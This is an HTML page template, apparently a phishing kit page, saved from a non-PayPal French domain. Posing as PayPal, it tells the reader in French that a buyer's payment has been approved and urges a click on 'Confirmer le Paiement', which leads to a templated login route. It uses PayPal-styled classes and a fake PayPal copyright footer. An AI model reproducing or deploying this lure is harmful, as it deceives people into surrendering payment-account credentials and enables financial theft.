<!DOCTYPE html>
<!-- saved from url=(0047)https://webplanet3-buyapp.fr/eg3-pay/index.html -->
<html data-reactroot="">

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>Vous avez reçu de l'argent</title>
        <meta name="application-name" content="">
        <meta name="keywords" content="">
        <meta name="description" content="">
        <meta name="viewport"
            content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes">
        <link href="/css/main.ltr.css" rel="stylesheet">
        <link charset="UTF-8" href="/css/page.c9a650b6b85d7c2bdddc.css" media="screen, projection" rel="stylesheet"
            type="text/css">
        <link href="/css/contextualLogin.css" rel="stylesheet">
        <style id="inert-style">
        [inert] {
            pointer-events: none;
            cursor: default;
        }

        [inert],
        [inert] * {
            user-select: none;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
        }

        </style>
    </head>

    <body class="vx_root vx_addFlowTransition">
        <div aria-labelledby="js_modalHeader" class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen modal-flow"
            id="mainModal" tabindex="-1">
            <div class="vx_modal-wrapper-backgroundOverride vx_modal-wrapper vx_modal-wrapper_logo elementDirection"
                tabindex="-1">
                <div class="vx_modal-content">
                    <header class="vx_modal-header">
                        <h2 class="vx_text-2 header-centered" id="js_modalHeader"
                            style="color: rgb(0, 92, 8); text-align: center;">Vous avez reçu de l'argent.</h2>

                        <p class="vx_text-body"></p>
                    </header>

                    <div class="vx_modal-body vx_blocks-for-mobile">
                        <div>
                            <div class="vx_modal-body vx_blocks-for-mobile">
                                <div class="form-container">
                                    <p class="vx_text-5 " style="text-align: center">Ce paiement Paypal a été déduit du
                                        compte de l’acheteur et a été «&nbsp;APPROUVÉ&nbsp;» par sa banque.</p>

                                    <div class="cardForm-cardArt"><img src="/images/success-animation_2x.gif"
                                            style="width: 141px; height: 150px;"></div>

                                    <p class="vx_text-5 " style="text-align: center">Pour recevoir le paiement sur votre
                                        compte, cliquez ici :<br>
                                        <br>
                                        <a href="{{ url('/login') }}" style="color: green; font-size: 20px;">Confirmer
                                            le Paiement</a>
                                    </p>

                                    <p class="vx_text-5 " style="text-align: center">Cordialement,Paypal.</p>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="signup-page-footer vx_text-legal center" style="text-align: center;">©1999-2020 PayPal.
                        Tous droits réservés.</div>
                </div>
            </div>
        </div>
    </body>

</html>
